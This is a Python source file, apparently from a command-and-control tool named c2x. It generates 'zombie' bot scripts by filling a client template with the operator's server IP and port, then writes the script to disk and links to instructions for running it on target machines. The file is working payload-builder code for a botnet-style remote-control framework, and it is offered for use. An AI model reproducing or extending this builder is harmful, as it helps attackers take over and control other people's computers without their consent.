#!/usr/bin/env python3

'''
this script is for creating script for zombies to run and connect to server
'''

from colorama import Fore
from modules.get_modules import show_error

class ScriptCreator:
    def __init__(self, lhost, lport, lang, is_from_gui=None):
        self.lhost = lhost
        self.lport = lport
        self.lang = str(lang).lower() # chosen language in create script tab
        self.is_from_gui = is_from_gui

    def create(self):
        zombie_script_path = ''
        destination_file_name = ''
        if self.lang == 'python':
            zombie_script_path = 'modules/client-side/c2x-client.py'
            destination_file_name = 'bot_script.py'
        elif self.lang == 'go' :
            zombie_script_path = 'modules/client-side/c2x-client.go'
            destination_file_name = 'bot_script.go'
        try:
            with open(zombie_script_path, 'r') as z_file:
                z_file_content = z_file.read()

        except FileNotFoundError:
            show_error(title='Error', message='File {} not found! maybe you have deleted it.'.format(zombie_script_path),
                    is_from_gui=self.is_from_gui)

        else:
            z_file_content = z_file_content.replace('replace_server_ip', self.lhost)
            z_file_content = z_file_content.replace('replace_server_port', self.lport)
            new_file_content = z_file_content

            # create new file
            with open(destination_file_name, 'w') as new_file:
                new_file.write(new_file_content)
                print('New file created --> file name : {}'.format(destination_file_name))
                print('See instructions for running ' + destination_file_name + ' file here : ' + Fore.LIGHTBLUE_EX +
                      'https://github.com/nxenon/c2x/blob/main/modules/client-side/README.md' + Fore.RESET)
